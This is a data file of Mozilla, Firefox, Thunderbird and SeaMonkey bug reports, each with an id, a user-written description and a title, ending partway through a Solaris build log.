8845,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322) Build Identifier: Mozilla Thunderbird version 1.5.0.9  There needs to be a way to delete messages in newsgroup without deleting all of them, especially when one is trying to get rid of porn posted on a newsgroup without having to delete all the good posts.  Reproducible: Always  Steps to Reproduce: 1.Get junk posting on newsgroup. 2.Try to delete it. 3.Find that there is no way to do so. Actual Results:   Post not deleted  Expected Results:   Delete unwanted post  I just can't understand why there was never an option put in the software to delete newsgroups.",No ability to delete messages in newsgroups
8887,"It has to be actually this command: mozilla -remote 'OpenURL()' which I expected to open a blank page. However, it crashed mozilla.  The other thing is that the URL given in 'mozilla -h' help http://home.netscape.com/newsref/std/x-remote.html is pretty old (1994) and most of the commands from netscape.ad (missing  in mozilla package!) don't work (fail to send error).","mozilla -remote ""openurl()"" crashes"
9038,Steps to reproduce:  1. Download the win32 build from http://ftp.mozilla.org/pub/mozilla.org/firefox/nightly/2005-10-24-23-mozilla1.8/ I used the zip for convenience. 2. Manually check for updates 3. Download update & restart  I saw the updater UI appear very briefly then Firefox does not restart. Testing on other platforms would be useful.,Firefox does not restart after update
9048,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0  After using the menu customization window, the File menu remains faded.  Reproducible: Always Steps to Reproduce: 1.right click on the navigation menue 2.select customize 3.hit done or the small x 4.Now the File, Edit, View .... remains faded Actual Results:   Menu remained hidden after viewing the customize menu  Expected Results:   Menu should not be faded out","Customize toolbars causes all menus to become faded/unuseable, can't customize again until restart"
9056,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915  In a site that allow several CSS choices from View->Use Style if one selects other than the default style and then opens some other page from the same site offering the same CSS choices the default is used, not the one that was selected before selecting a link.  This is important in sites that provide text-only/low-bw variants when used over modem or other non-broadband connection. Also important if using so visually better suitable CSS.  Reproducible: Always  Steps to Reproduce: 1. Open http://www.w3.org/Style/CSS/ 2. View->Use Style->Steely 3. Follow a link like ""learning CSS"" in the introduction. The new page does not use the selected ""Steely"" style altough it would be available.  Actual Results:   The new page does not use the selected style altough it would be available.  Expected Results:   The new page does use the selected style if it would be available.  Setting severity to major because this is a real PITA when browsing over GSM.",CSS selection not used when navigating
9119,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a1) Gecko/20060126 Firefox/1.6a1 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a1) Gecko/20060126 Firefox/1.6a1  I have tabs activated. If I open a 2nd tab I am unable to return to the 1st tab. Seems to have appeared since the last nightly update.  Reproducible: Always  Steps to Reproduce: 1. Open a url. 2. Open a new tab (Ctl-t) 3. Open another url in new tab 4. Click on 1st tab to attempt to return to it. Attempt fails, stay at 2nd tab.  Actual Results:   Followed above steps. Clicked on 1st tab which should have opened the 1st url, but nothing happened, i.e., stayed in 2nd tab window.  Expected Results:   Only way to get to 1st tab was to close the 2nd tab.","When have multiple tabs open, clicking on inactive tab does not activate it."
9162,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8b5) Gecko/20051015 Firefox/1.4.1 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8b5) Gecko/20051015 Firefox/1.4.1  In Firefox/Thunderbird 1.0.*, when I printed a web/email, I could change the default ""lpr"" command to the more apropiate (for me) ""kprinter"".  In current pre1.5 builds, I can't change the spooler program. I can print fine from firefox/thunderbird, but I have no control over the spooling process, queue control, filtering, etc. FF/TB seem to print directly to CUPS via LPR or similar. I can't change that.  Manipulating the ""prefs.js"" with a text editor, changing ""lpr"" to ""kprinter"" seems to have no effect.  Reproducible: Always  Steps to Reproduce: 1. Try to print a webpage/email 2. On the printer panel, choose ""properties"". 3. I can change paper size, margins, etc., but I can't change the command used internally to print. FF/TB seems to use CUPS directly.  Actual Results:   I have no control over spooler process, queue management, printing cancelation, filtering, etc.  Expected Results:   I would like to be able to choose the spooling command (for example, ""kprinter""), like in the 1.0.* releases.",I can't change the printer spooler
9192,"User-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8) Gecko/20060503 BonEcho/2.0a1 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8) Gecko/20060503 BonEcho/2.0a1  Ever since Places was disabled on branch, searching bookmarks hasn't worked. Searching from the bookmarks sidebar and bookmarks manager both don't work. I compiled a new build right before submitting this bug and it is still present, even with a new profile.  Reproducible: Always  Steps to Reproduce: 1. Open bookmarks sidebar or bookmarks manager 2. Search for a known bookmark  Actual Results:   Should find the bookmark  Expected Results:   doesn't find bookmark",Search Bookmarks Broken
9226,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060821 Firefox/2.0b2 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060821 Firefox/2.0b2  When a link is clicked in the forum, e.g. to view a thread, there is an undesired popup shown. However, if links are middle-clicked (opened in new tab in background), the popups are suppressed. Potential users have to register to use the forum.  http://www.fantasticsuperclub.org/  Reproducible: Always",Popup blocker does not manage to block all popups
9363,"User-Agent:       Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; InfoPath.2; FDM) Build Identifier: 2.0.0.3  At certain web pages, for example http://www.dpreview.com/ the entire web page is displayed on only the left 25% of the monitor.   Trying to correct this by using ctrl+ fails and the page becomes unreadable  This problem does not exist in Internet Explorer (ctrl+ scales the page properly)  Reproducible: Always  Steps to Reproduce: 1. enter into a webpage with the issue (http://www.dpreview.com/) 2. use a widescreen monitor. (2560x1600) 3. press ctrl+ repeatedly Actual Results:   using a widescreen monitor the page occupies 25% of one side of the screen and the text is very small  Expected Results:   1. the software should have scaled the entire web page up, instead of simply increasing the text size  2. Ideally ctrl+ should not have to be used at all, the page should scale to your display  I can provide screenshots if necessary  monitor: 2560x1600 OS: Vista  about:buildconfig  Build platform target i586-pc-msvc  Build tools Compiler 	Version 	Compiler flags $(CYGWIN_WRAPPER) cl 	12.00.8804 	-TC -nologo -W3 -Gy -Fd$(PDBFILE) $(CYGWIN_WRAPPER) cl 	12.00.8804 	-TP -nologo -W3 -Gy -Fd$(PDBFILE)  Configure arguments --enable-application=browser --enable-update-channel=release --enable-official-branding --enable-optimize --disable-debug --disable-tests --enable-static --disable-shared --enable-svg --enable-canvas --enable-update-packaging",Web Page Scaling issues (ctrl +) when using a widescreen monitor
9384,Navigating to a bookmarked URL by selecting it from the bookmarks menu fails (i.e. Firefox does not cause that item to be displayed in the browser).  Navigating to bookmarked items via the sidebar works as expected.  This problem seems to have been introduced in the following build:  Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a6pre) Gecko/20070616 Minefield/3.0a6pre  I have also confirmed that this problem exists in the latest trunk build for Windows.,Navigating to a bookmark via the Bookmarks menu fails effective 20070616 trunk build
9480,"STR: - open places/library - notice the given columns ""name"", ""tags"", ""location"" - add one (or more) columns (e.g. ""keyword"") - close the window and/or firefox in total  expected: after reopening places/library the above chosen ""extra-column"" (e.g. ""keyword"") should show up.  expected_deluxe: after restarting Firefox *and* places/library the above chosen ""extra-column"" (e.g. ""keyword"") should show up.  actual result: the chosen column is gone",make column changes in places/library (session) persistent
9527,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7 Build Identifier: Lightning 0.7RC2 2007101603  If the timezone setting in Lightning/Sunbird does not match the timezone setting of the system, then when you try to change the time in the ""New Event"" dialog box, both the start and end time are recalculated incorrectly.  Reproducible: Always  Steps to Reproduce: 1. Change your Lightning/Sunbird timezone to something other than the system time zone. 2. Create a new event by clicking ""File"" -> ""New"" -> ""Event..."" 3. Click on the ""Start"" time. 4. Click on any other field (such as ""Title"") 5. Click back and forth between the ""Start"" time field and another field.  Actual Results:   When you click off of the ""Start"" time field, the ""Start"" (and also the ""End"") time is changed to be several hours different from the desired time.  Expected Results:   The time should not change simply by selecting the ""Start"" time field and then selecting another field.  With the ""New Event"" (or ""New Task"") dialog box open, if I change either of the times, they are recalculated to be an incorrect time. The time is always changed by a fixed number of hours that appears to depend on the difference between the system timezone and the Lightning time zone.  In my case, my Windows XP timezone is set to ""Eastern Time (US & Canada)"", and the Lightning/Sunbird timezone is set to ""America/Boise"". This causes the time to be decremented by 4 hours on each recalculation.  I've tested this by changing the Lightning timezone to ""Europe/London"", and by changing the Windows XP timezone to ""Western Time (US & Canada)"", in each case experiencing the same problem.  For example, if I change the time to be 12:00pm (either by typing or by using the time-picker), as soon as I click off the field onto another field, the date is changed to 8:00pm. If I click back on ""Start Time"" then back to another field, the ""Start Time"" is changed to 4:00am. If I click back on ""Start Time"" again, then back to another field, the time is changed to 12:00am. Each time decrementing by 4 hours.  The same problem occurs with the ""End Time"" field.",Time incorrectly recalculated when Lightning/Sunbird timezone does not match system timezone (datepicker)
9530,"The dictionary page currently displays the most recent version of a dictionary, regardless of the file status of files in that version. It shouldn't use the most recent version if the file is incomplete, disabled, etc.",dictionary page doesn't honor file status
9682,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.0.2pre) Gecko/2008071002 SeaMonkey/2.0a1pre Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.0.2pre) Gecko/2008071002 SeaMonkey/2.0a1pre  When the download manager is open from the Tool menu, it shows a popup window with the following message:  Erreur d'analyse XML : entité non définie Emplacement : chrome://communicator/content/downloadmanager/downloadmanager.xul Numéro de ligne 53, Colonne 1 :<window id=""downloadManager"" ^  This gives in english something like ""XML parse error: entity not defined"".  This behavior is reproducible. This bug is obtained with the default theme; with the ""Modern"" theme, its even worth: the message does not appear and a strange scroll bar appears (no window: the scroll bar ""float"" on the screen and disapears when Ctrl+F4 is pressed).   I first downloaded the Seamonkey 2.0a1pre in french (do not remember which build), then updated the version to the current one from the ""Help"" menu.  Reproducible: Always  Steps to Reproduce: 1. Click on the Tool\Download Manager menu  Actual Results:   Popup window with an XML parse error message appears  Expected Results:   The download manager window should be opened.",parse error when the download manager is opened from the Tool menu
9750,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.2) Gecko/2008091620 Firefox/3.0.2 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.2) Gecko/2008091620 Firefox/3.0.2  Realplayer video download plugin doesnt work with version 3.  Reproducible: Always  Steps to Reproduce: 1.Install Firefox 3 2.open it 3.realplayer wont work DUH! Actual Results:   nothing, fix it!! GAHH",Realplayer Plugin doesnt work!
9812,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6  This is using Thunderbird version 3 alpha 1 (20060830)  Mailing list items are not selectable with mouse clicks  Reproducible: Always  Steps to Reproduce: 1.  Click ""Address Book"" on the main thunderbird window 2.  Select a mailing list (you may need to make one) 3.  Click Properties 4.  Attempt to click with the mouse on the listed items 5.  Observe that clicking has no effect but the focus remains on the last item 6.  Observe that SHIFT-TAB and TAB are effective in moving up and down the list, but the mouse clicks achieve nothing Actual Results:   Wrong behaviour  Expected Results:   Right behaviour","Address book mailing list items are not selectable with mouse clicks, preventing editing"
9831,"Downloaded and installed Java (Java(TM) Platform SE 6 U11 from the Sun Website.    Plug-in appears in about:plugins, however, when visiting a page that should launch it, (e.g. http://radar.weather.gov/radar.php?rid=JAX&product=N0R&overlay=11101111&loop=yes), plug-in does not launch (see attached screenshot).",32 bit Java plug-in not recognized in 64 bit Windows 7 beta
9861,"Bitdefender Internet Security 2009, version 12.0.12 with the latest update seems to be quarantining nssuti33.dll as a ""generic trojan"", affecting a lot of people on SUMO.  According to one user, it just updated ""an hour ago"".  There have been 7 users complaining about this on Live Chat in 15 minutes, along with numerous forum threads, so it seems that this is affecting a lot of users.","Bitdefender Internet Security deletes nssutil3.dll as ""generic trojan"""
9875,"User-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.10) Gecko/2009042809 GranParadiso/3.0.10 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.10) Gecko/2009042809 GranParadiso/3.0.10  Websites like sourceforge.net, ubuntu.com or many others especially commercial ones, which are using some of these annoying trackers like etracker.de or google-analytics.com, which don't care about privacy, can't be loaded and used anymore with Firefox 3.0.10 in cunjunction with Privoxy 3.0.12 and with JavaScript activated. These trackers seem to have switched from http to https lately.  If such a website is loaded, Firefox tries to load these tracker sites and doesn't timeout. This has the effect, that the actual website is not being loaded completely. This happens among others on the login page of sourceforge.net. If I have JavaScript and Privoxy enabled, the login page of sourceforge.net is not loaded anymore. Instead Firefox hangs on connecting to google-analytics.com. Logging into sourceforge.net is only possible with JavaScript disabled.  This only happens since Firefox 3.0.10. With Firefox 3.0.9 and other browsers like Opera and Midori these site are loaded completely and shown as expected.  See also my bug report for Privoxy: https://sourceforge.net/tracker/?func=detail&atid=460288&aid=2790091&group_id=11118  Reproducible: Always  Steps to Reproduce: 1. Start Privoxy. 2. Start Firefox, set the proxy for HTTP and SSL to 127.0.0.1:8118 and activate JavaScript 3. Go to http://sourceforge.net and click on the ""Log in"" link.",[regression] Websites are no longer rendered if SSL requests for JavaScripts are blocked
10012,"Plugins can call NPN_GetValue() with the values NPNVserviceManager, NPNVDOMElement, or NPNVDOMWindow and get pointers to XPCOM instances.  They should not be able to do this.  Among other reasons that this interface is troublesome is that it will extremely painful to impossible for us to support when plugins run in separate processes.",Stop allowing plugins to access XPCOM through NPN_GetValue()
10138,"User-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.9 Safari/533.2 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.9) Gecko/20100423 Thunderbird/3.0.4  OS: Kubuntu 10.04 amd64 TB: 3.0.4 (ubuntu build)  Have attempted to change the default browser on all applications to Google Chrome (/usr/bin/google-chrome). Set Google Chrome as the default browser in System Settings -> Default Programs -> Web Browser. Then I set the default browser from the terminal using ""sudo update-alternatives --config x-www-browser"" and selected Google Chrome as the default. Then I switched to TB and went to Edit -> Preferences -> Advanced -> Config Editor and added network.protocol-handler.app.ftp   /usr/bin/google-chrome network.protocol-handler.app.http  /usr/bin/google-chrome network.protocol-handler.app.https /usr/bin/google-chrome I also tried replacing /usr/bin/google-chrome with x-www-browser. These settings were not able to set google-chrome as the default browser, but kept Firefox as the default. I then tried changing the value of  browser.preferences.instantApply false to true, but I am unable to make the change to true permanent , whether I change the value trough a text editor in the ""User.js"" file or via Config Editor.  Tried several different ways of changing the values and in a lot of different orders with reboots and program restarts at various stages.  Reproducible: Always  Steps to Reproduce: 1.Try changing the default browser using Kubuntu 10.04 amd64 with TB 3.0.4 to Google Chrome 2. 3. Actual Results:   Unchanged default browser  Expected Results:   The default browser should have been changed to Google Chrome",Can't set default browser in TB 3.0.4 to Google Chrome in KDE
10274,"User-Agent:       Mozilla/5.0 (Windows NT 5.1; rv:2.0b6) Gecko/20100101 Firefox/4.0b6 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0b6) Gecko/20100101 Firefox/4.0b6  [Tools][Add-ons][Get Add-ons]  "" This content cannot be displayed in a frame                    To protect your security, the publisher of this content does not allow it to be displayed in a frame.        Click here to open this content in a new window ""   If I click on the ""Click here to ..."" it does NOT ""open a new window"" but instead goes to the URL in the same Browser (which _I_ enjoy but the Browser does not permit).  If I right-click on the ""Click here to ..."" and choose ""Open Link in New Window"" a new Browser Window DOES open but I still get the same message.  Reproducible: Always","Add-ons Manager - Get - ""This content cannot be displayed in a frame"""
10305,"User-Agent:       Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8pre) Gecko/20101124 Firefox/4.0b8pre Build Identifier:   Ever since bug 602284 landed on trunk I've been getting ""The Connection Was Reset"" message, but only intermittently. It doesn't seem specific to any site, but it appears to be more frequent to sites which have a high ping, perhaps something around 250 ms and above.  I've not been able to reproduce it at will.   Reproducible: Sometimes",Connection is reset message appears intermittently after landing of bug 592284
10349,"User-Agent:       Mozilla/5.0 (Windows NT 6.1; rv:2.0b6) Gecko/20100101 Firefox/4.0b6 Build Identifier: Mozilla/5.0 (Windows NT 6.1; rv:2.0b6) Gecko/20100101 Firefox/4.0b6  The ""Origins"" dropdown box on this page shows up way too narrow, and displays only one blank item when the arrow is clicked.  IE8 correctly shows a much wider box and displays a list of airports when the dropdown is selected.  The page is unusable in Firefox.  Reproducible: Always  Steps to Reproduce: 1.Go to the page. 2.""Origins"" dropdown box is very narrow. 3. Select dropdown - no entries on lists.    No theme.  Nothing unusual about PC config.",Dropdown box displays incorrectly - no text
10352,"A bunch of leak-like bugs have been reported recently, many of which look bad.    I figure it's useful to have a meta-bug because (a) some or all of them may have the same root cause (b) it'll help communicate the extent of the problem(s).    I've CC'd everyone who was CC'd to any of the dependent bugs.  Please add any other leak-like bugs I might have missed.",[meta] potentially blocking leaks and quasi-leaks for Firefox 4.0
10392,"User-Agent:       Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Build Identifier: Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0  Perhaps one of my most used and most valuable buttons is the multi-backspace button. You know, the one right beside the forward key that gives you a drop-down list of the last 10 or so pages you visited? Great for getting out of page loops where pressing backspace once navigates you to the same page. Every browser has this button. Every browser except the new Firefox 4 of course. Until this is fixed, it's IE9 time for me (unless I can somehow downgrade back to 3.6).  Reproducible: Always  Steps to Reproduce: 1.Look up at the main Firefox toolbar on any webpage. 2.Try to hit the multi-backspace key.  3.Fail miserably as you realize it isn't there anymore.",The multiple-backspace button is missing in Firefox 4.
10427,"User-Agent:       Mozilla/5.0 (Windows NT 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Windows NT 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1  Firefox now proposes me to ""Go to tab"" when I type something looking like to an existing tab. Original idea. It annoys me. I must be careful not to choose it by mistake when I type some stuff. I prefer not to have it, so my first request is:  Please provide an option to disable that.  Anyway, having this annoying ""Go to tab"" proposition *in addition to* the wanted entries would not a big deal.  But the ""Go to tab"" proposition *replaces* my wanted entry! This is much more serious. I have some page in the history, I begin typing its title or address, and it does not get auto-completed, and I can not go to it from the auto-complete history. This is really bad. So, my second request:  Please put the relevant entries in the auto-complete history, even if some of them are already open.  Thanks,  Nicolas Barbulesco   Reproducible: Didn't try  Steps to Reproduce: 1. Go to address www.apple.com/iphone/ in a Firefox tab. 2. Open a new Firefox window. 3. In the new window, begin typing the address ""www.apple.com/iphone/"" or the title ""Apple - iPhone 4 - Video calls, multitasking, HD video, and more"" of the page.   Actual Results:   The existing tab removes useful functionality.   Expected Results:   The existing tab adds some functionality or does nothing.   Firefox 4.0.1 Windows.","Auto-complete: ""Go to tab"""
10505,"User Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0 Build ID: 20120420145725  Steps to reproduce:  Attempted to share a picture to a windows live chat box ( right clicked and clicked 'copy'  then in the chat box, 'pasted')   Actual results:  When after clicking 'paste' in the chat box after right clicking copy on an image, it copied the image location and instead of showing the picture in the chat box.   Expected results:  It should have shown the image, rather than the image location. Normally to get the image location i would have to press 'copy image location'  but in this case, 'copy' was used, and it still gave me the image location without showing the picture.   (please note that before the latest update, the image would show with 'copy' and 'paste'.)","When trying to 'copy' a picture directly from Firefox into a windows live chat box, it copys the image location (link) instead of the image."
10543,"Found this while investigating bug 574353.  If a the window of a xul iframe is set as the focused window, and no element within it actually received focus, the iframe-window would still be marked as the focused window if the iframe is set hidden.  I cannot tell if this is a regression.",a iframe-window set as the focusedWindow still has focus after the iframe is set hidden
10549,"STR:  1) Enable maildir and offline storage 2) Create (using UI) a subfolder of INBOX  Subfolder gets created under INBOX instead of INBOX.sbd.  I suspect this is because in nsMsgDBFolder::CreateDirectoryForFolder the folder path is checked to see if it is a directory (which it is in maildir, but not in mbox) and that is used to determine whether the .sbd directory needs to be created.",newly created maildir subfolders folders are created under INBOX instead of INBOX.sbd
10556,"User-Agent:       Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.60 Safari/534.24 Build Identifier: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0  As part of the Offline Web Applications specification (http://www.w3.org/TR/offline-webapps/) there is a property set on the navigator object that will return whether a user is online or offline e.x.  navigator.onLine;  Currently Firefox 4 always returns true for the above check even when disconnected from the internet. There are also two events of the window Object that fires when a user connects or disconnects, these events are not being fired either.  The non firing events will not be such a concern if Firefox returned undefined for the navigator.onLine call instead of the current false, positive.   Reproducible: Always  Steps to Reproduce: 1. Add the following code to a HTML page: if(navigator.onLine) {     console.log(""online""); } else {     console.log(""offline""); } 2. Open the webpage while connected to the internet. You will find that the online is logged to the console. 3. Now disconnect from the internet and refresh the page. The above will still report that you are connected i.e. online  Actual Results:   Whether connected or not navigator.onLine always returns true  Expected Results:   The property should either be set to the correct states or return undefined if this part of the specification is not yet implemented to avoid false/positives.","navigator.onLine status for Offline Applications (navigator.onLine always returns true for desktop Firefox unless ""work offline"" is manually selected)"
10563,"when i set up a new event with e.g. ""alarm in 5 minutes"" - sometimes event alarms appear in 5 minutes, sometimes they don't.  this started a couple thunderbird versions ago (can't exactly tell when). now in TB 16.0.1 & Lightning 1.8 this problem problem still exists. this is happening in ubuntu 12.10. (but also happened in 12.04.).  event alarms should always appear at right time without necessity to restart thunderbird. to make sure i see all alarms, i always have to restart thunderbird.  then... often a huge list of alarms shows up.",to guarantee event alarm in lightning restart is necessary
10781,"This was happening since https://treeherder.mozilla.org/logviewer.html#?job_id=453122&repo=mozilla-betathe merge, but bug 1192986 was hiding it.","Permafailing serviceworkers/test_gzip_redirect.html,test_https_origin_after_redirect_cached.html,test_origin_after_redirect_cached.html,test_origin_after_redirect_to_https_cached.html | Test timed out. on the merge to beta"
10790,"Looks like Ts got hammered sometime between 1:00pm and 1:30pm Friday afternoon (2/28).  Here's the URL:  http://bonsai.mozilla.org/cvsquery.cgi?treeid=default&module=MozillaTinderboxAll&branch=HEAD&branchtype=match&dir=&file=&filetype=match&who=&whotype=match&sortby=Date&hours=2&date=explicit&mindate=02%2F28%2F2003+12%3A45%3A00&maxdate=02%2F28%2F2003+13%3A35%3A00&cvsroot=%2Fcvsroot  This is either (most likely) dougt or cbiesinger, my money is on dougt here :)  THIS IS A PERFORMANCE BLOCKER.",10% Ts performance regression 2/28
10840,"User-Agent:       Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9a1) Gecko/20050911 SeaMonkey/1.1a Build Identifier: Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9a1) Gecko/20050911 SeaMonkey/1.1a  /share/lang/i386/10/SUNWspro/bin/CC -o nsTraceRefcnt.o -c  -DOSTYPE=\""SunOS5\"" -DOSARCH=\""SunOS\"" -DBUILD_ID=2005091114 -I./../build  -I../../dist/include/string -I../../dist/include/xpcom -I../../dist/include -I../../dist/include/nspr    -I../../dist/sdk/include    -KPIC   -xbuiltin=%all -features=tmplife -mt  -DNDEBUG -DTRIMMED -O   -DMOZILLA_VERSION=\""1.9a1\"" -DMOZILLA_VERSION_U=1.9a1 -DSOLARIS=1 -DNSCAP_DISABLE_DEBUG_PTR_TYPES=1 -DD_INO=d_ino -DSTDC_HEADERS=1 -DHAVE_ST_BLKSIZE=1 -DHAVE_SIGINFO_T=1 -DHAVE_INT16_T=1 -DHAVE_INT32_T=1 -DHAVE_INT64_T=1 -DHAVE_UINT=1 -DHAVE_UINT_T=1 -DHAVE_UINT16_T=1 -DHAVE_DIRENT_H=1 -DHAVE_SYS_BYTEORDER_H=1 -DHAVE_GETOPT_H=1 -DHAVE_MEMORY_H=1 -DHAVE_UNISTD_H=1 -DHAVE_NL_TYPES_H=1 -DHAVE_MALLOC_H=1 -DHAVE_X11_XKBLIB_H=1 -DHAVE_SYS_STATVFS_H=1 -DHAVE_SYS_STATFS_H=1 -DHAVE_LIBM=1 -DHAVE_LIBDL=1 -DHAVE_LIBSOCKET=1 -DFUNCPROTO=15 -DHAVE_XSHM=1 -D_REENTRANT=1 -DHAVE_RANDOM=1 -DHAVE_STRERROR=1 -DHAVE_LCHOWN=1 -DHAVE_FCHMOD=1 -DHAVE_SNPRINTF=1 -DHAVE_MEMMOVE=1 -DHAVE_RINT=1 -DHAVE_STAT64=1 -DHAVE_LSTAT64=1 -DHAVE_FLOCKFILE=1 -DHAVE_LOCALTIME_R=1 -DHAVE_STRTOK_R=1 -DHAVE_LANGINFO_CODESET=1 -DVA_COPY=va_copy -DHAVE_VA_COPY=1 -DHAVE_I18N_LC_MESSAGES=1 -DMOZ_DEFAULT_TOOLKIT=\""gtk2\"" -DMOZ_WIDGET_GTK2=1 -DMOZ_ENABLE_XREMOTE=1 -DMOZ_X11=1 -DMOZ_SUITE=1 -DMOZ_BUILD_APP=suite -DMOZ_DISTRIBUTION_ID=\""org.mozilla\"" -DMOZ_ENABLE_XFT=1 -DMOZ_ENABLE_GNOMEUI=1 -DOJI=1 -DIBMBIDI=1 -DMOZ_VIEW_SOURCE=1 -DACCESSIBILITY=1 -DMOZ_XPINSTALL=1 -DMOZ_JSLOADER=1 -DMOZ_XTF=1 -DMOZ_MATHML=1 -DMOZ_UPDATE_CHANNEL=default -DMOZ_STORAGE=1 -DMOZ_LOGGING=1 -DMOZ_USER_DIR=\"".mozilla\"" -DMOZ_XUL=1 -DMOZ_PROFILELOCKING=1 -DMOZ_DLL_SUFFIX=\"".so\"" -DXP_UNIX=1 -DUNIX_ASYNC_DNS=1 -DJS_THREADSAFE=1 -DNS_PRINT_PREVIEW=1 -DNS_PRINTING=1 -DMOZ_ACCESSIBILITY_ATK=1 -DMOZILLA_LOCALE_VERSION=\""1.9a1\"" -DMOZILLA_REGION_VERSION=\""1.9a1\"" -DMOZILLA_SKIN_VERSION=\""1.8\""  -D_MOZILLA_CONFIG_H_ -DMOZILLA_CLIENT nsTraceRefcnt.cpp ""pldhash.c"", line 426: warning: statement not reached /share/lang/i386/10/SUNWspro/bin/CC -o nsGREGlue.o -c  -DOSTYPE=\""SunOS5\"" -DOSARCH=\""SunOS\"" -DBUILD_ID=2005091114 -I./../build  -I../../dist/include/string -I../../dist/include/xpcom -I../../dist/include -I../../dist/include/nspr    -I../../dist/sdk/include    -KPIC   -xbuiltin=%all -features=tmplife -mt  -DNDEBUG -DTRIMMED -O   -DMOZILLA_VERSION=\""1.9a1\"" -DMOZILLA_VERSION_U=1.9a1 -DSOLARIS=1 -DNSCAP_DISABLE_DEBUG_PTR_TYPES=1 -DD_INO=d_ino -DSTDC_HEADERS=1 -DHAVE_ST_BLKSIZE=1 -DHAVE_SIGINFO_T=1 -DHAVE_INT16_T=1 -DHAVE_INT32_T=1 -DHAVE_INT64_T=1 -DHAVE_UINT=1 -DHAVE_UINT_T=1 -DHAVE_UINT16_T=1 -DHAVE_DIRENT_H=1 -DHAVE_SYS_BYTEORDER_H=1 -DHAVE_GETOPT_H=1 -DHAVE_MEMORY_H=1 -DHAVE_UNISTD_H=1 -DHAVE_NL_TYPES_H=1 -DHAVE_MALLOC_H=1 -DHAVE_X11_XKBLIB_H=1 -DHAVE_SYS_STATVFS_H=1 -DHAVE_SYS_STATFS_H=1 -DHAVE_LIBM=1 -DHAVE_LIBDL=1 -DHAVE_LIBSOCKET=1 -DFUNCPROTO=15 -DHAVE_XSHM=1 -D_REENTRANT=1 -DHAVE_RANDOM=1 -DHAVE_STRERROR=1 -DHAVE_LCHOWN=1 -DHAVE_FCHMOD=1 -DHAVE_SNPRINTF=1 -DHAVE_MEMMOVE=1 -DHAVE_RINT=1 -DHAVE_STAT64=1 -DHAVE_LSTAT64=1 -DHAVE_FLOCKFILE=1 -DHAVE_LOCALTIME_R=1 -DHAVE_STRTOK_R=1 -DHAVE_LANGINFO_CODESET=1 -DVA_COPY=va_copy -DHAVE_VA_COPY=1 -DHAVE_I18N_LC_MESSAGES=1 -DMOZ_DEFAULT_TOOLKIT=\""gtk2\"" -DMOZ_WIDGET_GTK2=1 -DMOZ_ENABLE_XREMOTE=1 -DMOZ_X11=1 -DMOZ_SUITE=1 -DMOZ_BUILD_APP=suite -DMOZ_DISTRIBUTION_ID=\""org.mozilla\"" -DMOZ_ENABLE_XFT=1 -DMOZ_ENABLE_GNOMEUI=1 -DOJI=1 -DIBMBIDI=1 -DMOZ_VIEW_SOURCE=1 -DACCESSIBILITY=1 -DMOZ_XPINSTALL=1 -DMOZ_JSLOADER=1 -DMOZ_XTF=1 -DMOZ_MATHML=1 -DMOZ_UPDATE_CHANNEL=default -DMOZ_STORAGE=1 -DMOZ_LOGGING=1 -DMOZ_USER_DIR=\"".mozilla\"" -DMOZ_XUL=1 